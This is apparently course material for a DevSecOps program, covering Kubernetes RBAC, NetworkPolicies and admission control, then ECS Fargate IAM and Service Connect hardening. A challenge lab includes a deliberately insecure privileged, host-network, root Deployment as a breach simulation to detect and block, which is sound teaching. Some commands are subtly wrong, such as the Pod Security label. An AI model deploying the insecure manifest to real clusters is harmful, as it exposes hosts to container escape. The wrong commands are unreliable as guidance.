# 🧪 Guided Lab – Kubernetes Security I: RBAC, NetworkPolicies, and Namespace Isolation

---

## 🧭 Objective

Deploy the `auth-service` microservice into a **secure namespace (`auth-dev`)** with:

- 📛 Namespace-level isolation
- 🔐 RBAC permissions for DevSecOps engineers
- 🪪 Dedicated ServiceAccount with scoped permissions
- 🌐 NetworkPolicy limiting pod communication
- ❌ Admission rejection if resources are insecure

---

## 🛠️ Prerequisites

- `kubectl` and access to a cluster (Minikube, EKS, etc.)
- `kustomize` installed
- Sample Node.js `auth-service` container image (we'll use a placeholder)
- Cluster context set via `kubectl config use-context your-cluster`

---

## 1️⃣ Create a Secure Namespace

```bash
kubectl create namespace auth-dev
Optional: Annotate Namespace for OPA/Gatekeeper
kubectl annotate namespace auth-dev owner=devsecops-team
2️⃣ Define RBAC: Role + RoleBinding
📁 rbac/auth-role.yaml

apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: auth-dev
  name: auth-deployer
rules:
- apiGroups: ["", "apps"]
  resources: ["pods", "services", "deployments"]
  verbs: ["get", "list", "watch", "create", "update", "delete"]
📁 rbac/auth-rolebinding.yaml

apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: bind-auth-deployer
  namespace: auth-dev
subjects:
- kind: User
  name: devsecops-engineer
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: auth-deployer
  apiGroup: rbac.authorization.k8s.io
🛡️ Note: You can replace User with Group or ServiceAccount depending on your cluster auth method (OIDC, etc.).

3️⃣ Create a Scoped ServiceAccount
📁 auth-serviceaccount.yaml

apiVersion: v1
kind: ServiceAccount
metadata:
  name: auth-service-sa
  namespace: auth-dev
4️⃣ Deploy the Auth Service (Scoped)
📁 auth-deployment.yaml

apiVersion: apps/v1
kind: Deployment
metadata:
  name: auth-service
  namespace: auth-dev
spec:
  replicas: 1
  selector:
    matchLabels:
      app: auth
  template:
    metadata:
      labels:
        app: auth
    spec:
      serviceAccountName: auth-service-sa
      containers:
      - name: auth
        image: your-dockerhub-user/auth-service:latest
        ports:
        - containerPort: 3000
        securityContext:
          runAsNonRoot: true
          allowPrivilegeEscalation: false
📁 auth-service.yaml

apiVersion: v1
kind: Service
metadata:
  name: auth-service
  namespace: auth-dev
spec:
  selector:
    app: auth
  ports:
    - protocol: TCP
      port: 80
      targetPort: 3000
5️⃣ Apply a NetworkPolicy
📁 auth-networkpolicy.yaml

apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: auth-deny-all-except-db
  namespace: auth-dev
spec:
  podSelector:
    matchLabels:
      app: auth
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: db
🔒 This ensures only the db service can talk to auth-service.

6️⃣ Test Misconfigured Access (Optional)
Try to create a pod as a regular user or without ServiceAccount:

kubectl run debugpod --image=alpine -n auth-dev --command -- sleep 3600
Expected result: ❌ Fails if RBAC is applied properly and admission controllers block unsafe pods (depending on your policy config).

✅ Completion Checklist
Task	Complete
Created isolated namespace for auth-service	✅
Scoped RBAC role and bound to DevSecOps user	✅
Created secure ServiceAccount for app	✅
Deployed app using ServiceAccount with securityContext	✅
Enforced traffic restrictions with NetworkPolicy	✅
Blocked unsafe workloads (via policy or admission)	✅
🧠 Quick Recap
Resource	Purpose
Namespace	Segments and scopes resources for security
Role / RoleBinding	Controls who can act in namespace
ServiceAccount	Assigns pod-level identity
NetworkPolicy	Controls ingress/egress at network level
SecurityContext	Ensures non-root containers, least privileges

# 🧪 Challenge Lab – Simulating a Breach & Blocking Privilege Escalation in Kubernetes

---

## 🎯 Objective

Simulate a real-world insecure deployment and **harden your cluster** to defend against it by:

- Deploying a pod with dangerous configurations
- Detecting misconfigurations using tools or review
- Enforcing prevention using native and custom policies

---

## 🧩 Scenario

A junior engineer accidentally deploys a version of the `auth-service` with:

- `runAsRoot: true`
- `hostNetwork: true`
- Open network access
- No RBAC protections

As a DevSecOps engineer, you must:

1. Identify this insecure workload
2. Patch the deployment with security context
3. Apply **admission rules or network policy** to block such behavior in the future

---

## 1️⃣ Deploy an Insecure Auth Pod (Simulated Breach)

📁 `insecure-auth.yaml`

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: insecure-auth
  namespace: auth-dev
spec:
  replicas: 1
  selector:
    matchLabels:
      app: insecure-auth
  template:
    metadata:
      labels:
        app: insecure-auth
    spec:
      hostNetwork: true
      containers:
      - name: auth
        image: your-dockerhub-user/auth-service:latest
        ports:
        - containerPort: 3000
        securityContext:
          runAsUser: 0  # 👎 Runs as root
          privileged: true
kubectl apply -f insecure-auth.yaml
☠️ This deployment is insecure and simulates a real mistake or breach opportunity.

2️⃣ Review the Security Risks
Use tools like:

kubectl describe deployment insecure-auth -n auth-dev

kubescape scan framework nsa (requires installing kubescape)

Manual review: check for hostNetwork, runAsUser: 0, privileged: true

Expected Findings:

Issue	Risk
hostNetwork: true	Container can sniff host traffic
runAsUser: 0	Root user inside pod can escalate
privileged: true	Can access host devices and kernel
No securityContext	Lacks runtime restrictions
No ServiceAccount	May run with cluster-admin
3️⃣ Block the Breach Using Admission Controls
Option A: Native PodSecurity Admission (v1.25+)
kubectl label namespace auth-dev pod-security=restricted
This applies PodSecurity Standards to prevent privileged containers.

Option B: Gatekeeper with ConstraintTemplate (Preview)
Requires Open Policy Agent + Gatekeeper installed

📁 privileged-blocker.yaml

apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sPSPPrivilegedContainer
metadata:
  name: disallow-privileged-containers
spec:
  match:
    namespaces:
      - auth-dev
🔐 This rejects any pod that tries to run with privileged: true.

4️⃣ Apply a Fallback NetworkPolicy
📁 default-deny-egress.yaml

apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-egress
  namespace: auth-dev
spec:
  podSelector: {}
  policyTypes:
    - Egress
This blocks all outgoing traffic from pods in auth-dev. You can add explicit rules to allow auth → db, etc.

5️⃣ Cleanup & Re-Deploy Secure Version
kubectl delete deployment insecure-auth -n auth-dev
Re-deploy auth-service using:

runAsNonRoot: true

hostNetwork: false

allowPrivilegeEscalation: false

Proper ServiceAccount

Applied NetworkPolicy

✅ Completion Checklist
Task	✅
Simulated insecure deployment with root access	✅
Identified risks using CLI or tools	✅
Blocked privileged pod using policy	✅
Applied default-deny network policy	✅
Re-deployed secured auth-service	✅
🧠 Bonus Challenge (Optional)
Use OPA Gatekeeper to enforce:

Every pod must define runAsNonRoot: true

Labels like env=dev must be present

Use kubescape to get a score of your namespace

Enable audit logging for rejected API requests

# 🔐 Security – Kubernetes RBAC, NetworkPolicy & Admission Controls

---

## 🧠 Core Security Concepts

| Concept | Description |
|--------|-------------|
| 🔐 **RBAC** | Controls *who* can access Kubernetes resources and *what* they can do |
| 🛡️ **ServiceAccounts** | Assign identity to workloads (e.g. `auth-service`) instead of giving full cluster access |
| 🌐 **NetworkPolicy** | Controls *pod-to-pod* communication to enforce least privilege |
| 🚫 **Admission Controllers** | Prevent risky workloads from being created (e.g., privileged, root) |
| 🧱 **Namespace Isolation** | Logical security boundary; used to apply RBAC, NetworkPolicy, quota, PodSecurity rules |
| ⚠️ **SecurityContext** | Pod/container-level rules (e.g. disallow `runAsRoot`, disable privilege escalation) |

---

## 🔐 Security Threats Mitigated This Week

| Threat | Defense |
|--------|---------|
| 🚨 Developer accidentally deploys insecure pod (root, privileged) | Admission controller rejects it |
| 📡 Pod accesses unauthorized services (e.g., Redis, other microservices) | NetworkPolicy blocks traffic |
| 👤 Unauthorized user accesses dev namespace | RBAC prevents it |
| 🔧 Workloads inherit cluster-admin privileges | Explicit ServiceAccounts with scoped permissions |
| 🐛 Exploited container escalates to node | `securityContext` + admission controller block it |

---

## 🧩 Best Practices: RBAC in Production

- Use **Roles** + **RoleBindings** for namespace-specific permissions  
- Avoid `cluster-admin` outside break-glass scenarios  
- Audit users and groups mapped from IAM (e.g. via `aws-iam-authenticator`)  
- Use **read-only roles** for observability tooling  
- Store RBAC policies in Git (infrastructure as code)

---

## 🌐 Best Practices: NetworkPolicy

- Start with **default deny** (`podSelector: {}` + no `ingress`/`egress`)
- Allow traffic by **label** (e.g. `app=db`)
- Apply per-namespace **egress restrictions**
- Use `kube-dns` and `external access` selectively
- Keep a policy catalog for each service/environment combo (e.g. `auth → db` but not `auth → redis`)

---

## 🚫 Best Practices: Admission Control

| Method | Description | Use Case |
|--------|-------------|----------|
| ✅ **PodSecurity Standards (PSS)** | Built-in to K8s 1.25+ | Block privileged, root, `hostNetwork`, etc. |
| ✅ **OPA Gatekeeper** | Rego-based policies | Custom logic: enforce labels, owners, envs |
| ✅ **Kyverno** | Kubernetes-native YAML policies | Easy to use, supports mutation + generation |
| ✅ **ValidatingWebhookConfiguration** | Advanced, run your own webhook | Last resort for org-wide control |

---

## 🔁 Real DevSecOps Lifecycle Alignment

| Phase | Security Control |
|-------|------------------|
| **Plan** | Define RBAC roles and namespace boundaries in Git |
| **Develop** | Use kustomize overlays per environment (dev/staging/prod) |
| **Build** | Validate manifests with `kubeconform`, `kubescape`, or `OPA` |
| **Deploy** | Admission controllers block unsafe workloads |
| **Run** | NetworkPolicies prevent lateral movement |
| **Monitor** | Audit logs show denied access and rejected API calls |

---

## 🧰 Tools You Should Know

| Tool | Use |
|------|-----|
| `kubectl auth can-i` | Check if a user or SA has access |
| `kubescape`, `kubeaudit` | Scan cluster for security misconfigurations |
| `OPA + Gatekeeper` | Write and enforce admission policies |
| `Kyverno` | Enforce policies like "no image tag `latest`" |
| `Auditd`, `Falco`, `KubeArmor` | Detect runtime violations (covered in Week 14) |

---

## 🔒 How This Enables Zero Trust in Kubernetes

| Zero Trust Principle | Kubernetes Implementation |
|----------------------|---------------------------|
| 🧍 Never trust a user by default | Enforce RBAC on users/groups |
| 🤖 Never trust a workload by default | Use ServiceAccounts + admission controls |
| 🌐 Never trust network by default | Apply NetworkPolicies and default-deny |
| 🧪 Always verify everything | Use policy-as-code (OPA/Kyverno), mutate & validate |
| 📡 Audit everything | Enable API audit logging and monitor access patterns |

---

## ✅ Summary

This week taught you how to:

✅ Secure namespaces with **scoped RBAC**  
✅ Deploy microservices using **non-root, limited ServiceAccounts**  
✅ Restrict **network communication** to intended services  
✅ Detect and block **misconfigured workloads**  
✅ Integrate **Zero Trust** principles directly into Kubernetes

📁 Week11/Reflection.md
# 🧠 Reflection – Kubernetes Security I: RBAC, Network Policies & Admission Controls

---

## 🧩 What We Did

This week, we:

- Created an isolated Kubernetes namespace for `auth-service`
- Scoped developer access using **RBAC**
- Applied **NetworkPolicies** to restrict pod-to-pod communication
- Deployed with **ServiceAccounts** instead of using cluster-level identity
- Enforced workload security with **PodSecurity Admission** or **OPA/Kyverno**
- Simulated insecure deployments and actively blocked them

---

## 🔄 What We Learned

### ✅ Security by Design Works
- Most misconfigurations were blocked **before reaching production**.
- Enforcing security **at the manifest level** shifts controls left.

### ✅ Service Identity Is Critical
- Moving from cluster-wide identity to **per-ServiceAccount access** makes lateral movement significantly harder.
- Helps in future modules when we audit logs and connect requests to services.

### ✅ NetworkPolicies Need Planning
- It’s easy to accidentally block traffic (e.g. DNS, health probes).
- Label-based whitelisting helps organize policies cleanly.

---

## ⚠️ What Could Go Wrong in Production

| Risk | Impact |
|------|--------|
| 🔄 RBAC Misconfig | Locking out teams, or over-permissiveness |
| 🌐 NetworkPolicy Gaps | Internal services exposed to everyone |
| ❌ No Admission Controls | Anyone can deploy privileged containers |
| 🛑 Too Much Lockdown | Developers lose velocity without flexibility |
| 🔐 ServiceAccount Token Mounting | Auto-mount tokens can leak identity in sidecars |

---

## 🛠️ How to Improve This

- Apply a **default deny NetworkPolicy** in every namespace
- Use **namespace-bound IAM roles** (IRSA in EKS) instead of shared service accounts
- Integrate **OPA/Kyverno into CI/CD** to validate manifests before deploy
- Automate scanning with tools like **Kubescape** or **kube-bench**
- Track changes to RBAC using **audit logging** or **RBAC visualizers**

---

## 🔍 Real-World Interview Scenario

> **Interviewer:** "How would you ensure that only the frontend app can talk to the auth-service in Kubernetes?"

You could respond:

> "I'd use a combination of NetworkPolicies to restrict ingress to the auth-service to pods with the frontend label, and enforce that each workload uses its own ServiceAccount for traceability. I’d also ensure the deployment manifests are validated through an admission policy so the service cannot be deployed with insecure configurations."

---

## 🚀 How the App is Now More Secure

| Area | Change |
|------|--------|
| Auth-service namespace | Isolated with RBAC |
| Pod-level identity | Uses scoped ServiceAccount |
| Network communication | Restricted to db only |
| Root/privileged containers | Blocked by policy |
| Manifest validation | Enforced pre-deployment or at admission time |

---

## 🎓 Takeaways

- **Kubernetes is powerful**, but insecure by default unless you configure it correctly.
- DevSecOps means securing *everything as code* — RBAC, network access, and identity.
- Week 11 set the stage for deeper controls like:
  - Policy-as-Code (Week 13)
  - Runtime Security (Week 14)
  - Zero Trust Architecture (Week 17)

---

## ✅ You Are Now Able To:

- Lock down a namespace with RBAC and NetworkPolicies  
- Define service-level identity using ServiceAccounts  
- Enforce policy using admission control mechanisms  
- Recognize insecure deployments and block them  
- Confidently secure microservices in Kubernetes

# 🔐 Week 12 – ECS & Fargate Security I: IAM, Namespaces, and Service Connect

---

## 🎯 Goal

Understand and implement **secure service isolation and communication** using:

- ECS Fargate + **Service Connect**
- Environment-scoped **namespaces** (dev, staging, prod)
- Per-service **IAM roles**
- Scoped service-to-service communication with **versioning support**
- Runtime security constraints at the **task definition** level

---

## 🧠 Core DevSecOps Concepts

| Concept | Description |
|--------|-------------|
| 🔐 IAM Role Per Task | Each ECS service assumes only the minimum IAM permissions needed |
| 🌐 ECS Service Connect | Handles service discovery, connection, and namespace isolation |
| 🧱 Namespaces | Logical separation between environments (dev, qa, uat, staging, prod) |
| 🔄 Cross-env Routing | Enable dev to talk to specific staging version, block self-calls |
| 🧪 Runtime Controls | Configure task-level security (e.g., drop `CAP_SYS_ADMIN`) |
| 📜 Least Privilege | Enforce IAM scopes and inter-service rules tightly |

---

## 🧱 How the App Evolves This Week

| Area | Evolution |
|------|-----------|
| `auth-service`, `notes-service` | Deployed into ECS with scoped IAM roles |
| `Service Connect` | Used for routing within and across environments |
| Environment isolation | Dev can't talk to prod, can talk to staging (specific versions only) |
| Version routing | E.g., `notes-service-v2.staging` accessible from `auth-service.dev` |
| IAM | Each microservice gets its own execution role with exact policy needs |
| Runtime | Task definitions drop unused Linux capabilities for hardened workloads |

---

## 🛠️ Tools and Services

- Amazon ECS (Fargate launch type)
- ECS **Service Connect** (no App Mesh)
- AWS IAM (execution roles and task roles)
- Cloud Map (for DNS-based discovery within Service Connect)
- AWS CLI / AWS Console
- (Optional) VPC Lattice and eBPF runtime enforcement tools (Falco in future week)

---

## 🔐 Why This Matters

In production ECS setups:

- Services may talk to other environments or versions unintentionally
- IAM roles are reused broadly, increasing blast radius
- No way to audit or restrict runtime behavior (e.g., outbound access)

> ECS Service Connect + proper IAM + namespace boundaries = **Zero Trust in ECS**

---

## 📦 Learning Outcomes

✅ Use **Service Connect** to simplify and secure service discovery  
✅ Define per-service **IAM roles** and **environment-scoped policies**  
✅ Prevent ECS services from talking to themselves in dev  
✅ Enable **controlled version testing** (e.g., dev-service-A → staging-service-B:v2)  
✅ Harden ECS tasks with runtime-level configuration  

---

## 🛡️ DevSecOps Tie-In

| Practice | Implementation |
|---------|-----------------|
| Identity Isolation | Each service gets its own IAM execution role |
| Environment Isolation | Namespaces + Service Connect scope access |
| Least Privilege | Both in IAM and in task networking |
| Secure Communication | mTLS and DNS-based routing via Cloud Map |
| Policy-as-Code (preview for Week 13) | Future enforcement of IAM + Connect rules declaratively |

---

## ✅ Prerequisites

- AWS CLI configured
- An existing VPC (or Terraform/CDK setup)
- An IAM user/role with permission to:
  - Create ECS services
  - Create IAM roles and policies
  - Use Service Connect
- Docker container image for each microservice (e.g., `auth-service`, `notes-service`)
- GitLab or GitHub pipeline setup (optional for this week but builds into Week 13)

---

## 🔄 Coming Up Next

➡️ **Week 13: Policy-as-Code**  
We’ll enforce **deployment safety, IAM standards, and runtime policy** using tools like OPA (Open Policy Agent), Gatekeeper, and Kyverno.

# 🧪 Guided Lab – Secure ECS Fargate Deployment with Service Connect & IAM Isolation

---

## 🎯 Goal

Securely deploy `auth-service` and `notes-service` into ECS using:

- 🔐 **Per-service IAM roles**
- 🧱 **Service Connect namespaces** for dev, staging
- 🌐 **Cross-environment communication with versioning**
- ❌ Block same-service loopback (e.g. dev-auth → dev-auth)
- ✅ Allow dev-auth → staging-notes:v2 for integration testing

---

## 🛠️ Prerequisites

- AWS CLI configured and logged in
- ECS Fargate cluster created (`my-cluster`)
- Cloud Map service discovery enabled
- A VPC with at least 2 public/private subnets and internet gateway
- Docker images for:
  - `auth-service`
  - `notes-service-v1`, `notes-service-v2`

---

## 🗂️ Step 1: Create Service Connect Namespaces

```bash
aws servicediscovery create-namespace \
  --name dev \
  --type HTTP \
  --creator-request-id dev-$(date +%s)

aws servicediscovery create-namespace \
  --name staging \
  --type HTTP \
  --creator-request-id staging-$(date +%s)
Each namespace will be used to scope service discovery.

🔐 Step 2: Create IAM Task Roles per Service
📁 iam/auth-task-role.json

{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DynamoAccess",
      "Effect": "Allow",
      "Action": ["dynamodb:GetItem", "dynamodb:PutItem"],
      "Resource": "arn:aws:dynamodb:*:*:table/AuthTable"
    }
  ]
}
📁 iam/notes-task-role.json

{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "S3Access",
      "Effect": "Allow",
      "Action": ["s3:GetObject", "s3:PutObject"],
      "Resource": "arn:aws:s3:::notes-data/*"
    }
  ]
}
Create IAM roles:

aws iam create-role \
  --role-name ecs-auth-task-role \
  --assume-role-policy-document file://iam/ecs-trust.json

aws iam put-role-policy \
  --role-name ecs-auth-task-role \
  --policy-name auth-access \
  --policy-document file://iam/auth-task-role.json
Repeat for notes-service as needed.

📁 iam/ecs-trust.json

{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": { "Service": "ecs-tasks.amazonaws.com" },
      "Action": "sts:AssumeRole"
    }
  ]
}
🚀 Step 3: Define Task Definitions with Service Connect
📁 ecs/auth-task-def.json

{
  "family": "auth-service",
  "networkMode": "awsvpc",
  "executionRoleArn": "arn:aws:iam::<account-id>:role/ecsTaskExecutionRole",
  "taskRoleArn": "arn:aws:iam::<account-id>:role/ecs-auth-task-role",
  "containerDefinitions": [
    {
      "name": "auth",
      "image": "123456789012.dkr.ecr.us-west-2.amazonaws.com/auth-service:latest",
      "portMappings": [
        {
          "containerPort": 3000,
          "name": "auth",
          "appProtocol": "http"
        }
      ],
      "essential": true
    }
  ],
  "requiresCompatibilities": ["FARGATE"],
  "cpu": "256",
  "memory": "512"
}
Register it:

aws ecs register-task-definition \
  --cli-input-json file://ecs/auth-task-def.json
Repeat for notes-service (with v1, v2 variations in image/tag).

📦 Step 4: Deploy Services into Cluster with Connect Enabled
aws ecs create-service \
  --cluster my-cluster \
  --service-name auth-service-dev \
  --task-definition auth-service \
  --desired-count 1 \
  --launch-type FARGATE \
  --network-configuration "awsvpcConfiguration={subnets=[subnet-xyz],securityGroups=[sg-xyz],assignPublicIp=ENABLED}" \
  --service-connect-configuration "enabled=true,namespace=dev,services=[{portName=auth}]" \
  --scheduling-strategy REPLICA
Same idea for:

notes-service-v1 (in staging)

notes-service-v2 (in staging)

auth-service (in dev)

🔁 Step 5: Enable Cross-Version Communication
Allow auth-service.dev to call notes-service-v2.staging:

curl http://notes-service-v2.staging:3001/api/notes
You may configure DNS routing and allow-listing via:

Cloud Map DNS-based routing

Security groups (for port-level access control)

Service Connect’s internal proxy layer

❌ Block auth-service.dev → auth-service.dev using app-level or proxy-based rejection (handled in code or via ALB if needed).

🔒 Step 6: Harden the Task Runtime
In the containerDefinitions section, add:

"linuxParameters": {
  "capabilities": {
    "drop": ["ALL"]
  }
},
"readonlyRootFilesystem": true,
"user": "1000"
🛡️ This drops all Linux capabilities, uses a non-root user, and makes the container filesystem read-only.

✅ Completion Checklist
Task	✅
Created scoped namespaces for dev and staging	✅
Created per-service IAM roles for Fargate tasks	✅
Registered secure task definitions with roles	✅
Deployed auth-service and notes-service into ECS with Service Connect	✅
Allowed versioned access (e.g., dev → staging-v2)	✅
Dropped container capabilities and set user	✅
🧠 You Just Learned:
How to securely deploy services in ECS using Fargate

How to isolate environments using Service Connect namespaces

How to define least privilege IAM roles per microservice

How to use ECS Service Connect for version-aware routing

How to apply runtime security settings (drop CAP_*, rootless tasks)

# 🧪 Challenge Lab – Secure ECS Service Isolation and Cross-Version Testing

---

## 🎯 Objective

Put your skills to the test by deploying two services:

- A **dev version** of `auth-service` (v1)
- Two **staging versions** of `notes-service` (`v1` and `v2`)

Your challenge is to:

1. Prevent `auth-service` in **dev** from calling itself (loopback)
2. Allow it to call **only** `notes-service-v2` in staging
3. Apply **least privilege IAM roles**
4. Enforce **runtime hardening**
5. Block insecure traffic patterns and validate connectivity via logs or curl

---

## 🛠️ Lab Requirements

| Component | Requirement |
|----------|-------------|
| ECS Cluster | Exists with public/private subnets |
| IAM Roles | 1 per service with scoped policies |
| Namespaces | `dev`, `staging` |
| Task Definition | Hardened, Service Connect enabled |
| Image Tags | Use v1 for dev, v2 for staging |

---

## 🧩 Part 1: Deploy Staging Versions

Create two services in the `staging` namespace:

- `notes-service-v1.staging`
- `notes-service-v2.staging`

Both should respond on port `3001`.

Verify you can curl:

```bash
curl http://notes-service-v2.staging:3001/health
✅ Should return 200 OK.

🧩 Part 2: Deploy Dev Auth-Service
Deploy auth-service in the dev namespace.

This service:

Must have IAM scoped only to what it needs (e.g., Dynamo access)

Must not be able to access auth-service.dev (itself)

Must be able to reach only notes-service-v2.staging

🧪 Part 3: Attempt Unauthorized Loopback
Inside the container, run:

curl http://auth-service.dev:3000/api/profile
✅ This should fail — your app or network rules must block it.

You may enforce this using:

Application logic (deny calls to its own DNS)

Security groups (block outbound to its own IP/DNS)

Env variable-based allowlisting

🧪 Part 4: Allow Cross-Version Call
From auth-service.dev, call:

curl http://notes-service-v2.staging:3001/api/notes
✅ This should succeed.

Make sure:

Service Connect routes it correctly

The DNS is resolvable

Staging v2 is accessible from the dev namespace

🔐 Part 5: IAM Audit
From the AWS CLI:

aws iam get-role-policy \
  --role-name ecs-auth-task-role \
  --policy-name auth-access
✅ Confirm the role only has permission to:

Access DynamoDB:AuthTable

No permissions to invoke Lambda, access S3, etc.

🛡️ Part 6: Runtime Hardening
Inspect the task definition:

✅ It should include:

"user": "1000"

"readonlyRootFilesystem": true

"capabilities": { "drop": ["ALL"] }

Also test within the container:

id   # should return uid=1000
touch /tmp/test  # should fail if root FS is readonly
✅ Completion Checklist
Task	Status
notes-service-v1 and v2 deployed in staging	✅
auth-service deployed in dev with IAM and runtime hardening	✅
Loopback to auth-service.dev fails	✅
Access to notes-service-v2.staging succeeds	✅
IAM role is scoped only to required permissions	✅
Runtime settings enforced (non-root, readonly FS)	✅
🧠 Reflection Prompts
How would you enforce these rules at scale across 50+ services?

What if notes-service was compromised? Could it access prod?

Where would you store access rules (e.g., YAML, Terraform, CDK)?

📁 Week12/Security.md
# 🔐 Security – ECS & Fargate with Service Connect, IAM, and Zero Trust

---

## 🧠 Core Security Concepts Implemented

| Concept | Description |
|--------|-------------|
| 🔐 **Per-Service IAM Roles** | Services assume scoped IAM roles; no shared roles |
| 🧱 **Namespace Isolation** | Service Connect namespaces (`dev`, `staging`) enforce separation |
| 🔁 **Cross-Version Routing** | Dev can talk to staging-v2, but not staging-v1 or self |
| 🧪 **Runtime Hardening** | Drop Linux capabilities, run as non-root, read-only filesystem |
| 📜 **Least Privilege Principle** | IAM policies and networking are minimized to service need |

---

## 🔐 Threats Mitigated This Week

| Threat | Mitigation |
|--------|------------|
| 🧬 Lateral Movement | Service Connect + security groups block peer-to-peer by default |
| 🦠 Self-invocation loops | Application or networking rules prevent loopback access |
| ⚙️ Privileged containers | Task definitions explicitly drop all Linux capabilities |
| 🧾 Over-privileged IAM roles | Scoped IAM task roles allow only necessary actions |
| 🧑‍💻 Dev service accessing prod data | Namespace boundaries enforce strict routing per env |

---

## 📡 Service-to-Service Access Matrix

| From → To | Result |
|----------|--------|
| `auth-service.dev` → `auth-service.dev` | ❌ Blocked |
| `auth-service.dev` → `notes-service-v1.staging` | ❌ Blocked |
| `auth-service.dev` → `notes-service-v2.staging` | ✅ Allowed |
| `auth-service.dev` → `notes-service.prod` | ❌ Blocked (no DNS route, no IAM permissions) |

---

## 🧱 Why Service Connect Is a DevSecOps Enabler

| Feature | Security Benefit |
|--------|------------------|
| 🔐 Namespaces | Provide logical isolation per environment (Zero Trust principle) |
| 🧭 Service Discovery | DNS-resolvable names (e.g., `notes-v2.staging`) reduce config drift |
| 💂‍♀️ Sidecar Proxy | Enables observability and mTLS (optional), better audit trails |
| 🧪 Per-Service Access | Controlled routing allows test staging features in prod-safe ways |

---

## 🛡️ DevSecOps Lifecycle Integration

| Phase | Security Practice |
|-------|-------------------|
| **Plan** | Define environment-based namespaces and IAM roles in Git |
| **Develop** | Use feature branches mapped to ECS service versions |
| **Build** | Inject IAM + Service Connect config via CI pipeline |
| **Deploy** | Controlled rollout per namespace (e.g., staging-v2) |
| **Run** | Runtime constraints via task definition |
| **Monitor** | CloudWatch logs, ECS Exec, IAM CloudTrail auditing |

---

## 🔁 Real-World ECS Scenarios

### 1. **Microservice Breakout Prevention**

> Risk: Compromised dev-service talks to prod.

✅ Mitigation:
- No DNS for `*.prod` in dev namespace
- Separate IAM roles; no shared credentials

---

### 2. **Versioned Canary Testing**

> Scenario: Test new `notes-service-v2` only with `auth-service.dev`.

✅ Mitigation:
- Deploy `notes-service-v2.staging`
- Route traffic **only** from `auth-service.dev` using Service Connect
- Avoid sending prod traffic to v2 until approved

---

### 3. **IAM Lateral Blast Radius**

> Problem: Shared IAM role leaks access to S3, SNS, Lambda across services.

✅ Mitigation:
- Each ECS service has a **dedicated IAM task role**
- IAM policy boundaries enforced via Git and Terraform

---

## 🔐 Best Practices Summary

| Area | Recommendation |
|------|----------------|
| IAM | Define one IAM role per service/task with least privilege |
| Service Connect | Use namespaces for env isolation and enforce sidecar rules |
| Network | Enforce egress rules via SGs + avoid default open rules |
| Runtime | Use `readonlyRootFilesystem`, drop all `CAP_*`, run as UID ≠ 0 |
| DNS Routing | Use `notes-service-v2.staging` explicitly for version pinning |
| Infra as Code | Codify all service definitions (CDK, Terraform) and review via PRs |

---

## ✅ You Now Understand

✅ How to enforce **Zero Trust** within ECS using namespaces and routing

✅ How to configure **runtime hardening** in ECS task definitions  
✅ When and why to use **version-specific routing** for integration testing  
✅ How **Service Connect** simplifies and secures ECS microservice access

📁 Week12/Reflection.md
# 📘 Reflection – ECS & Fargate Security I: IAM, Namespaces & Service Connect

---

## 🧩 What We Did

This week, we:

- Used **ECS Fargate** to deploy `auth-service` and `notes-service`
- Isolated services using **Service Connect namespaces** (`dev`, `staging`)
- Scoped **IAM roles per service** for minimum access
- Enabled **cross-environment, versioned communication**
- Hardened the runtime with **non-root user**, `CAP_*` drop, and **read-only FS**
- Prevented loopback service access (e.g., `auth-service.dev → auth-service.dev`)

---

## 🧠 Key Takeaways

### 🔐 Service Isolation Is a Must
Without namespaces, everything talks to everything. You implemented **clear boundaries** using ECS-native features, achieving:

- Environment-level segmentation
- Version-level routing control
- App-level protection from misrouted traffic

### 🔄 Versioned Inter-Service Testing Is Real
Instead of spinning up entire new environments, we used **Service Connect** to let one service (in `dev`) talk to a **specific version** of another (in `staging`). This is **DevSecOps in action**:

> Controlled testing, fast feedback, safe by design.

### 🧾 IAM Needs Discipline
This week reinforced that **shared IAM roles are a vulnerability**. With task-scoped roles:

- Access is explicit and audit-friendly
- You can trace logs or CloudTrail events to a service identity
- Escalations or accidental access is far less likely

### 🔧 Runtime Hardening Is Powerful (and Easy)
Just a few fields in the ECS task definition — `readonlyRootFilesystem`, `user`, `drop capabilities` — created a hardened runtime posture.

---

## ⚠️ Common Pitfalls We Avoided

| Mistake | What We Did Instead |
|--------|---------------------|
| Shared task roles | One IAM role per ECS service |
| Flat networking | Namespaces + security groups |
| Over-privileged containers | Hardened runtime via task definition |
| Implicit access between services | Explicit Service Connect config per port + version |
| Testing with production data | Dev only talks to staging-v2 |

---

## 💬 Real-World Considerations

| Question | Thought |
|----------|---------|
| How do you block `auth-service.dev` from accessing `notes-service-v1.staging`? | Use scoped DNS and firewall rules |
| Can Service Connect enforce HTTPS or mTLS? | Currently plaintext with optional TLS. Add ALB/NLB or App Mesh if needed |
| What if dev service needs temporary access to prod service? | Use environment-specific DNS and **short-lived IAM policy overrides** via CI/CD approval flows |
| How is this audited? | IAM CloudTrail + ECS Exec logging + VPC Flow logs |
| How does this scale? | Pair with **CDK or Terraform** and codify access matrix using Git PRs and policies (next week!) |

---

## 🛠️ How the App Evolved

| Area | Change |
|------|--------|
| Services | Moved from Docker Compose to ECS-managed Fargate deployments |
| Identity | Scoped IAM per microservice |
| Comms | Namespaces and version-aware service calls via Service Connect |
| Runtime | Secure-by-default task definitions |
| Security | Blocked dev self-calls, enforced Zero Trust boundaries |

---

## ✅ You Are Now Able To:

✅ Deploy ECS Fargate services with **minimal IAM permissions**  
✅ Enforce **cross-env versioned routing** with Service Connect  
✅ Apply **runtime security policies** to containers  
✅ Design **Zero Trust ECS architectures**  
✅ Prepare for **Policy-as-Code** enforcement in Week 13

---

- IAM and service boundaries
- Deployment rules

This is the glue that brings all of our work under **auditable, reviewable control**.

# 🧠 Week 13 – Policy-as-Code (OPA, Kyverno, Gatekeeper)

---

## 🎯 Goal

Introduce and implement **Policy-as-Code** using tools like:

- **OPA (Open Policy Agent)** – General-purpose policy engine
